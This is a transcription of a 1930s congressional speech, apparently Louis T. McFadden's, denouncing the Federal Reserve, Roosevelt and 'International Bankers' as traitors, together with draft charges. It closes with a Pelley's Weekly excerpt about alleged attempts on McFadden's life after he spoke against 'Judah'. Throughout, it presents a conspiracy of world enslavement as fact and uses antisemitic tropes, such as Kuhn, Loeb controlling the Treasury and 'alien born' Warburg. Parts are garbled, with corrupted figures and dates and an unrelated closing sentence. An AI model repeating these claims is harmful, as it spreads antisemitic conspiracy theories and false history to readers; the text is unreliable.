" Mr. Chairman , when you hold a $ 10.00 Fed Note in your hand , you are holding apiece of paper which sooner or later is going to cost the United States Government $ 10.00 in gold ( unless the Government is obliged to go off the gold standard ) .
It is based on limburger cheese ( reported to be in foreign warehouses ) or in cans purported to contain peas ( but may contain salt water instead ) , or horse meat , illicit drugs , bootleggers fancies , rags and bones from Soviet Russia ( of which these United States imported over a million dollars worth last year ) , on wines whiskey , natural gas , goat and dog fur , garlic on the string , and Bombay ducks . "
" If you like to have paper money - which is secured by such commodities - you have it in Fed Note .
If you desire to obtain the thing of value upon which this paper currency is based , that is , the limburger cheese , the whiskey , the illicit drugs , or any of the other staples - you will have a very hard time finding them . "
" Many of these worshipful commodities are in foreign Countries .
Are you going to Germany to inspect her warehouses to see if the specified things of value are there ?
I think more , I do not think that you would find them there if you did go . "
" On April 27 , 1932 , the Fed outfit sent $ 750,000 belonging to American bank depositors in gold to Germany .
A week later another $ 300,000 in gold was shipped to Germany .
About the middle of May $ 12,000,000 in gold was shipped to Germany by the Fed .
Almost every week there is a shipment of gold to Germany .
These shipments are not made for profit on the exchange since the German marks are blow parity with the dollar . "
" Mr. Chairman , I believe that the National Bank depositors of these United States have a right to know what the Fed are doing with their money .
There are millions of National Bank depositors in the Country who do not know that a percentage of every dollar they deposit in a Member Bank of the Fed goes automatically to American Agents of the foreign banks and that all their deposits can be paid away to foreigners without their knowledge or consent by the crooked machinery of the Fed and the questionable practices of the Fed . "
[ Ed. Note - Problem with next paragraph in original ] " Mr. Chairman , the American people should be told the truth by their servants in office .
In 1930 , we had over a half billion dollars outstanding daily to finance foreign goods stored in or shipped between several billion dollars .
What goods are these on which the Fed yearly pledge several billions of dollars .
In its yearly total , this item amounts to several billions of dollars of the public credit of these United States ? "
" What goods are those which are hidden in European and Asiatic stores have not been seen by any officer of our Government but which are being financed on the public credit of the United States Government ?
What goods are those upon which the 17 United States Government is being obligated by the Fed to issue Fed Notes to the extent of several billions of dollars a year ? "
The Bankers ' Acceptance Racket
" The Fed have been International Banks from the beginning , with these United States as their enforced banker and supplier of currency .
But it is none the less extraordinary to see these twelve private credit monopolies , buying the debts of foreigners against foreigners , in all parts of the world and asking the Government of these United States for new issues of Fed notes in exchange for them .
The magnitude of the acceptance racket as it has been developed by the Fed , their foreign correspondents , and the predatory European born bankers , who set up the Fed here and taught your own , by and of pirates , how to loot the people : I say the magnitude of this racket is estimated to be in the neighborhood of 9,000,000,000 per year .
In the past ten years it is said to have amounted to $ 90,000,000,000.00 .
In my opinion it has amounted to several times that much .
coupled to this you have to the extent of billions of dollars , the gambling in the United States securities , which takes place in the same open discount market - a gambling on which the Fed is now spending $ 100,000,000.00 per week . "
" Fed Notes are taken from the U.S. Government in unlimited quantities .
Is is strange that the burden of supplying these immense sums of money to the gambling fraternity has at last proved too heavy for the American people to endure ?
Would it not be a national [ calamity to ] again bind down this burden on the backs of the American people and by means of a long rawhide whip of the credit masters , compel them to enter another seventeen years of slavery ? "
" They are trying to do that now .
They are trying to take $ 100,000,000.00 of the public credit of the United States every week , in addition to all their other seizures and they are sending that money to the nefarious open market in a desperate gamble to reestablish their graft as a going concern . "
" They are putting the United States Government in debt to the extent of $ 100,000,000 a week , and with the money they are buying our Government securities for themselves and their foreign principals .
Our people are disgusted with the experiences of the Fed .
The Fed is not producing a loaf of bread , a yard of cloth , a bushel of corn , or a pile of cordwood by its check - kiting operations in the money market . "
" Mr. Speaker , on the 13th of January of this year I addressed the House on the subject of the Reconstruction Finance Corporation .
In the course of my remarks I made the following statement :
In 1928 the member banks of the Fed borrowed $ 60,598,690,000 .
from the Fed on their fifteen - day promissory notes .
Think of it .
Sixty billion dollars payable on demand in gold in the course of one single year .
The actual amount of such obligations called for six times as much monetary gold as there is in the world .
Such transactions represent a grant in the course of one single years of about $ 7,000,000 to every member of the Fed . "
" Is it any wonder that American labor which ultimately pays the cost of all banking operations of this Country has at last proved unequal to the task of supplying this huge total of cash and credit for the benefit of the stock market manipulators and foreign swindlers ?
In 1933 the Fed presented the staggering amount of $ 60,598,690,000 to its member banks at the expense of the wage earners and tax payers of these United States .
In 1929 , the year of the stock market crash , the Fed advanced $ 58,000,000,000 to member banks . "
" In 1930 while the speculating banks were getting out of the stock market at the expense of the general public , the Fed advanced them $ 13,022,782,000 .
This shows that when the banks were gambling on the public credit of these United States as represented by the Fed currency they were subsidized to any amount they required by the Fed .
When the swindle began to fall , the bankers knew it in advance and withdrew from the market .
They got out with whole skins - and left the people of these United States to pay the piper .
My friend from Kansas , Mr. McGugin , has stated that he thought the Fed lent money on rediscounting .
So they do , but they lend comparatively little that way .
The real discounting that they do has been called a mere penny in the slot business .
It is too slow for genuine high flyers .
They discourage it .
They prefer to subsidize their favorite banks by making them $ 60,000,000,000 advances and they prefer to acquire assistance in the notorious open discount market in New York , where they can use it to control the price of stocks and bonds on the exchanges . "
" For every dollar they advanced on discounts in 1928 , they lent $ 33.00 to their favorite banks for whom they do a business of several billion dollars income tax on their profits to these United States . "
The John Law Swindle
" This is the John Law swindle over again .
The theft of Teapot Dome was trifling compared to it .
What King ever robbed his subject to such an extent as the Fed has robbed us ?
Is it any wonder that there have been lately ninety cases of starvation in one of the New York hospitals ?
Is there any wonder that the children are being abandoned ? "
" The government and the people of these United States have been swindled by swindlers deluxe to whom the acquisition of American or a parcel of Fed Notes presented no more difficulty than the drawing up of a worthless acceptance in a Country not subject to the laws of these United States , by sharpers not subject to the jurisdiction of these United States , sharpers with strong banking " fence " on this side of the water , a ' fence ' acting as a receiver of a worthless paper coming from abroad , endorsing it and getting the currency out of the Fed for it as quickly as possible exchanging that currency for gold and in turn transmitting the gold to its foreign confederates . "
Ivar Kreuger , the Match King !
" Such were the exploits of Ivar Krueger , Mr. Hoover 's friend , and his rotten Wall Street bakers .
Every dollar of the billions Kreuger and his gang drew out of this Country on acceptances was drawn from the government and the people of the United States through the Fed .
The credit of the United States Government was peddled to him by the Fed for their own private gain .
That is what the Fed has been doing for many years . "
" They have been peddling the credit of this Government and the [ signature of this ]
Government to the swindlers and speculators of all nations .
That is what happens when a Country forsakes its Constitution and gives its sovereignty over the public currency to private interests .
Give them the flag and they will sell it . "
" The nature of Kreuger 's organized swindle and the bankrupt condition of Kreuger 's combine was known here last June when Hoover sought to exempt Krueger 's loan to Germany of $ 125,000,000 from the operation of the Hoover Moratorium .
The bankrupt condition of Krueger 's swindle was known her last summer when $ 30,000,000 was taken from the American taxpayers by certain bankers in New York for the ostensible purpose of permitting Krueger to make a loan to Colombia .
Colombia never saw that money . "
" The nature of Krueger 's swindle was known here in January when he visited his friend , Mr. Hoover , at the White House .
It was known here in March before he went to Paris and committed suicide . "
" Mr. Chairman , I think the people of the United States are entitled to know how many billions of dollars were placed at the disposal of Krueger and his gigantic combine by the Fed , and to know how much of our Government currency was issued and lost in the financing of that great swindle in the years during which the Fed took care of Krueger 's requirements . "
" A few days ago , the President of the United States with a white face and shaking hands , went before the Senate of behalf of the moneyed interests and asked the Senate to levy a tax on the people so that foreigners might know that these United States would pay its debt to them . "
" Most Americans thought it was the other way around .
What does these United States owe foreigners ?
When and by whom was the debt incurred ?
It was incurred by the Fed , when they peddled the signature of the Government to foreigners - for a Price .
It is what the United States Government has to pay to redeem the obligations of the Fed . "
Thieves Go Scot Free
" Are you going to let these thieves get off scot free ?
Is there one law for the looter who drives up to the door of the United States Treasury in his limousine and another for the United States Veterans who are sleeping on the floor of a dilapidated house on the outskirts of Washington ? "
" The Baltimore and Ohio Railroad is here asking for a large loan from the people , and the wage earners and the taxpayers of these United States .
It is begging for a handout from the Government .
It is standing , cap in hand , at the door of the R.F.C. where all the jackals have gathered to the feast .
It is asking for money that was raised from the people by taxation and wants this money of the poor for the benefit of Kuhn , Loeb and Co. , the German International Bankers . "
" Is there one law for the Baltimore and Ohio Railroad and another for the hungry veterans it threw off its freight cars the other day ?
Is there one law for sleek and prosperous swindlers who call themselves bankers and another law for the soldiers who defended the flag ?
The R.F.C. is taking over these worthless securities from the Investment Trusts with United States Treasury money at the expense of the American taxpayer and the wage earner . "
" It will take twenty years to redeem our Government .
Twenty years of penal servitude to pay off the gambling debts of the traitorous Fed and to vast flood of American wages and savings , bank deposits , and the United States Government credit which the Fed exported out of this country to their foreign principals . "
" The Fed lately conducted an anti-hoarding campaign here .
They they took that extra money which they had persuaded the American people to put into the banks - they sent it to Europe - along with the rest .
In the last several months , they have sent $ 1,300,000,000 in gold to their foreign employers , their foreign masters , and every dollar of that gold belonged to the people of these United States and was unlawfully taken from them . "
Fiat Money
" Mr. Chairman , within the limits of the time allowed me , I cannot enter into a particularized discussion of the Fed .
I have singled out the Fed currency for a few remarks because there has lately been some talk here of ' fiat money . '
What kind of money is being pumped into the open discount market and through it into foreign channels and stock exchanges ?
Mr. Mills of the Treasury has spoken here of his horror of the printing presses and his horror of dishonest money .
He has no horror of dishonest money .
If he had , he would be no party to the present gambling of the Fed in the nefarious open discount market of New York , a market in which the sellers are represented by 10 discount corporations owned and organized by the very banks which own and control the Fed . "
" Fiat money , indeed ! "
" What Mr. Mills is fighting for is the preservation , whole and entire , of the banker 's monopoly of all the currency of the United States Government . "
" Mr. Chairman , last December , I introduced a resolution here asking for an examination and an audit of the Fed and all related matters .
If the House sees fit to make such an investigation , the people of these United States will obtain information of great value .
This is a Government of the people , by the people , for the people .
Consequently , nothing should be concealed from the people .
The man who deceives the people is a traitor to these United States . "
" The man who knows or suspects that a crime has been committed and who conceals and covers up that crime is an accessory to it .
Mr. Speaker , it is a monstrous thing for this great nation of people to have its destinies presided over by a traitorous government board acting in secret concert with international usurers . "
" Every effort has been made by the Fed to conceal its powers - but the truth is - the Fed has usurped the Government .
It controls everything here and it controls all of our foreign relations .
It makes and breaks governments at will . "
" No man and no body of men is more entrenched in power than the arrogant credit monopoly which operated the Fed .
What National Government has permitted the Fed to steal from the people should now be restored to the people .
The people have a valid claim against the Fed .
If that claim is enforced the Americans will not need to stand in the bread line , or to suffer and die of starvation in the streets .
Women will be saved , families will be kept together , and American children will not be dispersed and abandoned . "
" Here is a Fed Note .
Immense numbers of the notes are now held abroad .
I am told that they amount to upwards of a billion dollars .
They constitute a claim against our Government and likewise a claim against our peoples ' money to the extent of $ 1,300,000,000 which has within the last few months been shipped abroad to redeem Fed Notes and to pay other gambling debts of the traitorous Fed .
The greater part of our money stock has been shipped to other lands . "
" Why should we promise to pay the debts of foreigners to foreigners ?
Why should the Fed be permitted to finance our competitors in all parts of the world ?
Do you know why the tariff was raised ?
It was raised to shut out the flood of Fed Goods pouring in here from every quarter of the globe - cheap goods , produced by cheaply paid foreign labor , on unlimited supplies of money and credit sent out of this Country by the dishonest and unscrupulous Fed . "
" The Fed are spending $ 100,000,000 a week buying government securities in the open market and are making a great bid for foreign business .
They are trying to make rates so attractive that the human hair merchants and the distillers and other business entities in foreign land will come her and hire more of the public credit of the United States Government to pay the Fed outfit for getting it for them . "
World Enslavement Planned
" Mr. Chairman , when the Fed was passed , the people of these United States did not perceive that a world system was being set up here which would make the savings of the American school teacher available to a narcotic - drug vendor in Acapulco .
They did not perceive that these United States was to be lowered to the position of a coolie country which has nothing but raw material and heart , that Russia was destined to supply the man power and that this country was to supply the financial power to an ' international superstate . '
A superstate controlled by international bankers , and international industrialists acting together to enslave the world for their own pleasure ? "
" The people of these United States are being greatly wronged .
They have been driven from their employments .
They have been dispossessed from their homes .
They have been evicted from their rented quarters .
They have lost their children .
They have been left to suffer and die for lack of shelter , food , clothing and medicine . "
" The wealth of these United States and the working capital have been taken away from them and has either been locked in the vaults of certain banks and the great corporations or exported to foreign countries for the benefit of the foreign customers of these banks and corporations .
So far as the people of the United States are concerned , the cupboard is bare . "
" It is true that the warehouses and coal yards and grain elevators are full , but these are padlocked , and the great banks and corporations hold the keys . "
" The sack of these United States by the Fed is the greatest crime in history . "
" Mr. Chairman , a serious situation confronts the House of Representatives today .
We are trustees of the people and the rights of the people are being taken away from them .
Through the Fed the people are losing the rights guaranteed to them by the Constitution .
Their property has been taken from them without due process of law .
Mr. Chairman , common decency requires us to examine the public accounts of the Government and see what crimes against the public welfare have been committed . "
" What is needed here is a return to the Constitution of these United States . "
" The old struggle that was fought out here in Jackson 's time must be fought our over again .
The independent United States Treasury should be reestablished and the Government should keep its own money under lock and key in the building the people provided for that purpose . "
" Asset currency , the devise of the swindler , should be done away with .
The Fed should be abolished and the State boundaries should be respected .
Bank reserves should be kept within the boundaries of the States whose people own them , and this reserve money of the people should be protected so that the International Bankers and acceptance bankers and discount dealers cannot draw it away from them . "
" The Fed should be repealed , and the Fed Banks , having violated their charters , should be liquidated immediately .
Faithless Government officials who have violated their oaths of office should be impeached and brought to trial . "
" Unless this is done by us , I predict , that the American people , outraged , pillaged , insulted and betrayed as they are in their own land , will rise in their wrath , and will sweep the money changers out of the temple . "
" Mr. Chairman , the United States is bankrupt :
It has been bankrupted by the corrupt and dishonest Fed .
It has repudiated its debts to its own citizens .
Its chief foreign creditor is Great Britain , and a British bailiff has been at the White House and the British Agents are in the United States Treasury making inventory arranging terms of liquidations ! "
Great Britain , Partner in Blackmail
" Mr. Chairman , the Fed has offered to collect the British claims in full from the American public by trickery and corruption , if Great Britain will help to conceal its crimes .
The British are shielding their agents , the Fed , because they do not wish that system of robbery to be destroyed here .
They wish it to continue for their benefit !
By means of it , Great Britain has become the financial mistress of the world .
She has regained the position she occupied before the World War . "
" For several years she has been a silent partner in the business of the Fed .
Under threat of blackmail , or by their bribery , or by their native treachery to the people of the United States , the officials in charge of the Fed unwisely gave Great Britain immense gold loans running into hundreds of millions of dollars .
They did this against the law !
Those gold loans were not single transactions .
They gave Great Britain a borrowing power in the United States of billions .
She squeezed billions out of this Country by means of her control of the Fed . "
" As soon as the Hoover Moratorium was announced , Great Britain moved to consolidate her gains .
After the treacherous signing away of American rights at the 7 - power conference at London in July , 1931 , which put the Fed under the control of the Bank of International Settlements , Great Britain began to tighten the hangman 's noose around the neck of the United States . "
" She abandoned the gold standard and embarked on a campaign of buying up the claims of foreigners against the Fed in all parts of the world .
She has now sent her bailiff , Ramsey MacDonald , here to get her war debt to this country canceled .
But she has a club in her hands !
She has title to the gambling debts which the corrupt and dishonest Fed incurred abroad . "
" Ramsey MacDonald , the labor party deserter , has come here to compel the President to sign on the dotted line , and that is what Roosevelt is about to do !
Roosevelt will endeavor to conceal the nature of his action from the American people .
But he will obey the International Bankers and transfer the war debt that Great Britain should pay to the American people , to the shoulders of the American taxpayers . "
" Mr. Chairman , the bank holiday in the several States was brought about by the corrupt and dishonest Fed .
These institutions manipulated money and credit , and caused the States to order bank holidays . "
" These holidays were frame - ups !
They were dress rehearsals for the national bank holiday which Franklin D. Roosevelt promised Sir Ramsey MacDonald that he would declare . "
" There was no national emergency here when Franklin D. Roosevelt took office excepting the bankruptcy of the Fed - a bankruptcy which has been going on under cover for several years and which has been concealed from the people so that the people would continue to permit their bank deposits and their bank reserves and their gold and the funds of the United States Treasury to be impounded in these bankrupt institutions . "
" Under cover , the predatory International Bankers have been stealthily transferring the burden of the Fed debts to the people 's Treasury and to the people themselves .
They the farms and the homes of the United States to pay for their thievery !
That is the only national emergency that there has been here since the depression began . "
" The week before the bank holiday was declared in New York State , the deposits in the New York savings banks were greater than the withdrawals .
There were no runs on New York Banks .
There was no need of a bank holiday in New York , or of a national holiday . "
Roosevelt and the International Bankers
" Roosevelt did what the International Bankers ordered him to do ! "
" Do not deceive yourself , Mr. Chairman , or permit yourself to be deceived by others into the belief that Roosevelt 's dictatorship is in any way intended to benefit the people of the United States : he is preparing to sign on the dotted line !
He is preparing to cancel the war debts by fraud ! "
" He is preparing to internationalize this Country and to destroy our Constitution itself in order to keep the Fed intact as a money institution for foreigners .
" Mr. Chairman , I see no reason why citizens of the United States should be terrorized into surrendering their property to the International Bankers who own and control the Fed .
The statement that gold would be taken from its lawful owners if they did not voluntarily surrender it , to private interests , show that there is an anarchist in our Government . "
" The statement that it is necessary for the people to give their gold - the only real money - to the banks in order to protect the currency , is a statement of calculated dishonesty ! "
" By his unlawful usurpation of power on the night of March 5 , 1933 , and by his proclamation , which in my opinion was in violation of the Constitution of the United States , Roosevelt divorced the currency of the United States from gold , and the United States currency is no longer protected by gold .
It is therefore sheer dishonesty to say that the people 's gold is needed to protect the currency . "
" Roosevelt ordered the people to give their gold to private interests - that is , to banks , and he took control of the banks so that all the gold and gold values in them , or given into them , might be handed over to the predatory International Bankers who own and control the Fed . "
" Roosevelt cast his lot with the usurers .
He agreed to save the corrupt and dishonest at the expense of the people of the United States . "
" He took advantage of the people 's confusion and weariness and spread the dragnet over the United States to capture everything of value that was left in it .
He made a great haul for the International Bankers . "
" The Prime Minister of England came here for money !
He came here to collect cash ! "
" He came here with Fed Currency and other claims against the Fed which England had bought up in all parts of the world .
And he has presented them for redemption in gold . "
" Mr. Chairman , I am in favor of compelling the Fed to pay their own debts .
I see no reason why the general public should be forced to pay the gambling debts of the International Bankers . "
Roosevelt Seizes the Gold
" By his action in closing the banks of the United States , Roosevelt seized the gold value of forty billions or more of bank deposits in the United States banks .
Those deposits were deposits of gold values .
By his action he has rendered them payable to the depositors in paper only , if payable at all , and the paper money he proposes to pay out to bank depositors and to the people generally in lieu of their hard earned gold values in itself , and being based on nothing into which the people can convert it the said paper money is of negligible value altogether . "
" It is the money of slaves , not of free men .
If the people of the United States permit it to be imposed upon them at the will of their credit masters , the next step in their downward progress will be their acceptance of orders on company stores for what they eat and wear .
Their case will be similar to that of starving coal miners .
They , too , will be paid with orders on Company stores for food and clothing , both of indifferent quality and be forced to live in Company - owned houses from which they may be evicted at the drop of a hat .
More of them will be forced into conscript labor camps under supervision . "
" At noon on the 4th of March , 1933 , FDR with his hand on the Bible , took an oath to preserve , protect and defend the Constitution of the U.S.
At midnight on the 5th of March , 1933 , he confiscated the property of American citizens .
He took the currency of the United States standard of value .
He repudiated the internal debt of the Government to its own citizens .
He destroyed the value of the American dollar .
He released , or endeavored to release , the Fed from their contractual liability to redeem Fed currency in gold or lawful money on a parity with gold .
He depreciated the value of the national currency . "
" The people of the U.S. are now using unredeemable paper slips for money .
The Treasury cannot redeem that paper in gold or silver .
The gold and silver of the Treasury has unlawfully been given to the corrupt and dishonest Fed .
And the Administration has since had the effrontery to raid the country for more gold for the private interests by telling our patriotic citizens that their gold is needed to protect the currency . "
" It is not being used to protect the currency !
It is being used to protect the corrupt and dishonest Fed .
The directors of these institutions have committed criminal offense against the United States Government , including the offense of making false entries on their books , and the still more serious offense of unlawfully abstracting funds from the United States Treasury !
Roosevelt 's gold raid is intended to help them out of the pit they dug for themselves when they gambled away the wealth and savings of the American people . "
Dictatorship
" The International Bankers set up a dictatorship here because they wanted a dictator who would protect them .
They wanted a dictator who would protect them .
They wanted a dictator who would issue a proclamation giving the Fed an absolute and unconditional release from their special currency in gold , or lawful money of any Fed Bank . "
" Has Roosevelt relieved any other class of debtors in this country from the necessity of paying their debts ?
Has he made a proclamation telling the farmers that they need not pay their mortgages ?
Has he made a proclamation to the effect that mothers of starving children need not pay their milk bills ?
Has he made a proclamation relieving householders from the necessity of paying rent ? "
Roosevelt 's Two Kinds of Laws
" Not he !
He has issued one kind of proclamation only , and that is a proclamation to relieve international bankers and the foreign debtors of the United States Government . "
" Mr. Chairman , the gold in the banks of this country belongs to the American people who have paper money contracts for it in the form of national currency .
If the Fed cannot keep their contracts with United States citizens to redeem their paper money in gold , or lawful money , then the Fed must be taken over by the United States Government and their officers must be put on trial . "
" There must be a day of reckoning .
If the Fed have looted the Treasury so that the Treasury cannot redeem the United States currency for which it is liable in gold , then the Fed must be driven out of the Treasury . "
" Mr. Chairman , a gold certificate is a warehouse receipt for gold in the Treasury , and the man who has a gold certificate is the actual owner of a corresponding amount of gold stacked in the Treasury subject to his order . "
" Now comes Roosevelt who seeks to render the money of the United States worthless by unlawfully declaring that it may No Longer be converted into gold at the will of the holder . "
" Roosevelt 's next haul for the International Bankers was the reduction in the pay of all Federal employees . "
" Next in order are the veterans of all wars , many of whom are aged and inform , and other sick and disabled .
These men had their lives adjusted for them by acts of Congress determining the amounts of the pensions , and , while it is meant that every citizen should sacrifice himself for the good of the United States , I see no reason why those poor people , these aged Civil War Veterans and war widows and half - starved veterans of the World War , should be compelled to give up their pensions for the financial benefit of the International vultures who have looted the Treasury , bankrupted the country and traitorously delivered the United States to a foreign foe . "
" There are many ways of raising revenue that are better than that barbaric act of injustice . "
" Why not collect from the Fed the amount they owe the U.S. Treasury in interest on all the Fed currency they have taken from the Government ?
That would put billions of dollars into the U.S. Treasury . "
" If FDR is as honest as he pretends to be , he will have that done immediately .
And in addition , why not compel the Fed to disclose their profits and to pay the Government its share ? "
" Until this is done , it is rank dishonesty to talk of maintaining the credit of the U.S. Government .
My own salary as a member of Congress has been reduced , and while I am willing to give my part of it that has been taken away from me to the U.S. Government , I regret that the U.S. has suffered itself to be brought so low by the vultures and crooks who are operating the roulette wheels and faro tables in the Fed , that is now obliged to throw itself on the mercy of its legislators and charwomen , its clerks , and it poor pensioners and to take money out of our pockets to make good the defalcations of the International Bankers who were placed in control of the Treasury and given the monopoly of U.S. Currency by the misbegotten Fed .
I am well aware that the International Bankers who drive up to the door of the United States Treasury in their limousines , look down with scorn upon members of Congress because we work for so little , while they draw millions a year .
The difference is that we earn , or try to earn , what we get - and they steal the greater part of their takings . "
Enemies of the People They Rob
" I do not like to see vivisections performed on human beings .
I do not like to see the American people used for experimental purposes by the credit masters of the United States .
They predicted among themselves that they would be able to produce a condition here in which American citizens would be completely humbled and left starving and penniless in the streets . "
" The fact that they made that assertion while they were fomenting their conspiracy against the United States that they like to see a human being , especially an American , stumbling from hunger when he walks .
Something should be done about it , they say .
Five - cent meals , or something !
" But FDR will not permit the House of Representatives to investigate the condition of the Fed. FDR will not do that .
He has certain International Bankers to serve .
They not look to him as the man Higher Up who will protect them from the just wrath of an outraged people . "
" The International Bankers have always hated our pensioners .
A man with a small pension is a ward of the Government .
He is not dependent upon them for a salary or wages .
They can not control him .
They do not like him .
It gave them great pleasure , therefore , to slash the veterans . "
" But FDR will never do anything to embarrass his financial supporters .
He will cover up the crimes of the Fed . "
" Before he was elected , Mr. Roosevelt advocated a return to the earlier practices of the Fed , thus admitting its corruptness .
The Democratic platform advocated a change in the personnel of the Fed .
These were campaign bait .
As a prominent Democrat lately remarked to me ; ' There is no new deal .
The same old crowd is in control . ' "
" The claims of foreign creditors of the Fed have no validity in law .
The foreign creditors were the receivers - and the willing receivers - of stolen goods !
They have received through their banking fences immense amounts of currency , and that currency was unlawfully taken from the United States Treasury by the Fed . "
" England discovered the irregularities of the Fed quite early in its operations and through fear , apparently , the Fed have for years suffered themselves to be blackmailed and dragooning England to share in the business of the Fed .
The Fed have unlawfully taken many millions of dollars of the public credit of the United States and have given it to foreign sellers on the security of the Debt paper of foreign buyers in purely foreign transactions , and when the foreign buyers refused to meet their obligations and the Fed saw no honest way of getting the stolen goods back into their possession , they decided by control of the executive to make the American people pay their losses ! "
Conspiracy of War Debts
" They likewise entered into a conspiracy to deprive the people of the U.S. of their title to the war debts and not being able to do that in the way they intended , they are now engaged in an effort to debase the American dollar so that foreign governments will have their debts to this country cut in two , and then by means of other vicious underhanded arrangements , they propose to remit the remainder . "
" So far as the U.S. is concerned , the gambling counters have no legal standing .
The U.S. Treasury cannot be compelled to make good the gambling ventures of the corrupt and dishonest Fed .
Still less should the bank deposits of the U.S. be used for that purpose .
Still less should the national currency have been made irredeemable in gold so that the gold which was massed and stored to redeem the currency for American citizens may be used to pay the gambling debts of the Fed for England 's benefit .
The American people should have their gold in their own possession where it cannot be held under secret agreement for any foreign control bank , or world bank , or foreign nation .
Our own citizens have the prior claim to it .
The paper [ money men ] have in their possession deserves redemption far more than U.S. currency and credit which was stolen from the U.S. Treasury and bootlegged abroad . "
" Why should the foreigners be made preferred creditors of the bankrupt U.S. ?
Why should the U.S. be treated as bankrupt at all ?
This Government has immense sums due it from the Fed .
The directors of these institutions are men of great wealth .
Why should the guilty escape the consequences of their misdeeds ?
Why should the people of these U.S. surrender the value of their gold bank deposits to pay off the gambling debts of these bankers ?
Why should Roosevelt promise foreigners that the U.S. will play the part of a good neighbor , ' meeting its obligations ' ? "
" Let the Fed meet their own obligations . "
" Every member of the Fed should be compelled to disgorge , and every acceptance banker and every discount corporation which has made illegal profits by means of public credit unlawfully bootlegged out of the U.S. Treasury and hired out by the crooks and vultures of the Fed should be compelled to disgorge . "
Federal Reserve Pays No Taxes
" Gambling debts due to foreign receivers of stolen goods should not be paid by sacrificing our title to our war debts , the assets of the U.S. Treasury - which belong to all the people of the U.S. and which it is our duty to preserve inviolate in the people 's treasury . "
" The U.S. Treasury can not be made liable for them .
The Fed currency must be redeemed by the Fed banks or else these Fed banks must be liquidated . "
" We know from assertions made here by the Hon . John N. Garner , Vice - President of the U.S. that there is a condition in the [ United States such ] would cause American citizens , if they knew what it was , to lose all confidence in their government . "
" That is a condition that Roosevelt will not have investigated .
He has brought with him from Wall Street , James Warburg , the son of Paul M. Warburg .
Mr. Warburg , alien born , and the son of an alien who did not become naturalized here until several years after this Warburg 's birth , is a son of a former partner of Kuhn , Loeb and Co. , a grandson of another partner , a nephew of a former partner , and a nephew of a present partner . "
" He holds no office in our Government , but I am told that he is in daily attendance at the Treasury , and that he has private quarters there !
In other words , Mr. Chairman , Kuhn , Loeb and Company now has control and occupy the U.S. Treasury . "
Preferred Treatment for Foreigners
" The text of the Executive order which seems to place an embargo on shipments of gold permits the Secretary of the Treasury , a former director of the corrupt , to issue licenses at his discretion for the export of gold coin , or bullion , earmarked or held in trust for a recognized foreign government or foreign central bank for international settlement .
Now , Mr. Chairman , if gold held in trust for those foreign institutions may be sent to them , I see no reason why gold held in trust for American as evidenced by their gold certificates and other currency issued by the U.S. Government should not be paid to them .
" I think that American citizens should be entitled to treatment at least as good as that which the person is extending to foreign governments , foreign central banks , and the bank of International Settlements .
I think a veteran of the world war , with a $ 20.00 gold certificate , is at least as much entitled to receive his own gold for it , as any international banker in the city of New York or London . "
" By the terms of this executive order , gold may be exported if it is actually required , for the fulfillment of any contract entered into prior to the date of this order by an applicant who , in obedience to the executive order of April 5 , 1933 , has delivered gold coin , gold bullion , or gold certificates .
This means that gold may be exported to pay the obligations abroad of the Fed which were incurred prior to the date of the order , namely , April 20 , 1933 . "
" If a European Bank should send 100,000,000 dollars in Fed currency to a bank in this country for redemption , that bank could easily ship gold to Europe in exchange for that currency .
Such Fed currency would represent ' contracts ' entered into prior to the date of the order .
If the Bank of International Settlements or any other foreign bank holding any of the present gambling debt paper of the Fed should draw a draft for the settlement of such obligation , gold would be shopped to them because the debt contract would have been entered into prior to the date of order . "

" Whereas I charge them , jointly and severally , with having unlawfully issued Fed currency on false , worthless and fictitious acceptances and other circulating evidence of debt , and with having made unlawful advances of Fed currency , and with having unlawfully permitted renewals of acceptances and renewals of other circulating evidences of debt , and with having permitted acceptance bankers and discount dealer corporations and other private bankers to violate the banking laws of the U.S. ; and

" Whereas I charge them , jointly and severally , with conniving with the Edge Law banks , and other Edge Law institutions , accepting banks , and discount corporations , foreign central banks of issue , foreign commercial banks , foreign corporations , and foreign individuals with funds unlawfully taken from the U.S. Treasury ; and I charge them with having unlawfully permitted and made possible ' new financing ' for foreigners at the expense of the U.S.
Treasury to the extent of billions of dollars and with having unlawfully permitted and made possible the bringing into the United States of immense quantities of foreign securities , created in foreign countries for export to the U.S. and with having unlawfully permitted the said foreign securities to be imported into the U.S. instead of gold , which was lawfully due to the U.S. on trade balances and otherwise , and with having lawfully permitted and facilitated the sale of the said foreign securities in the U.S. , and
" Whereas I charge them , jointly and severally , with having unlawfully exported U.S. coins and currency for a sinister purpose , and with having deprived the people of the U.S. of their lawful medium of exchange , and I charge them with having arbitrarily and unlawfully reduced the amount of money and currency in circulation in the U.S. to the lowest rate per capita in the history of the Government , so that the great mass of the people have been left without a sufficient medium of exchange , and I charge them with concealment and evasion in refusing to make known the amount of U.S. money in coins and paper currency exported and the amount remaining in the U.S. as a result of which refusal the Congress of the U.S. is unable to ascertain where the U.S. coins and issues of currency are at the present time , and what amount of U.S. currency is now held abroad ; and
" Whereas I charge them , jointly and severally , with having arbitrarily and unlawfully raised and lowered the rates of money and with having arbitrarily increased and diminished the volume of currency in circulation for the benefit of private interests at the expense of the Government and the people of the U.S. and with having unlawfully manipulated money rates , wages , salaries and property values both real and personal , in the U.S. by unlawful operations in the open discount market and by resale and repurchase agreements unsanctioned by law , and

Act is the matter of benefit which was secured by Ramsey MacDonald , the Prime Minister of Great Britain , upon the occasion of his latest visit to the U.S.
Treasury , and whereas there is grave danger that the accused will employ the provision creating U.S. Government securities to the extent of $ 3,000,000,000 and three millions in currency to be issuable thereupon for the benefit of themselves and their foreign principals , and that they will convert the currency so obtained to the uses of Great Britain by secret arrangements with the Bank of England of which they are the agents , and for which they maintain an account and perform services at the expense of the U.S.
Treasury , and that they will likewise confer benefits upon the Bank of International Settlements for which they maintain an account and perform services at the expense of the U.S. Treasury ; and

" Attacks on McFadden 's Life Reported "
Commenting on Former Congressman Louis T. McFaddens 's " heart - failure sudden - death " on Oct. 3 , 1936 , after a " dose " of " intestinal flu , " " Pelley 's Weekly " of Oct. 14 said :
Now that this sterling American patriot has made the Passing , it can be revealed that not long after his public utterance against the encroaching powers of Judah , it became known among his intimates that he had suffered two attacks against his life .
The first attack came in the form of two revolver shots fired at him from ambush as he was alighting from a cab in front of one of the Capital hotels .
Fortunately both shots missed him , the bullets burying themselves in the structure of the cab .
" He became violently ill after partaking of food at a political banquet at Washington .
His life was only saved from what was subsequently announced as a poisoning by the presence of a physician friend at the banquet , who at once procured a stomach pump and subjected the Congressman to emergency treatment . "

The survey found Northern Ireland was the most observant UK region
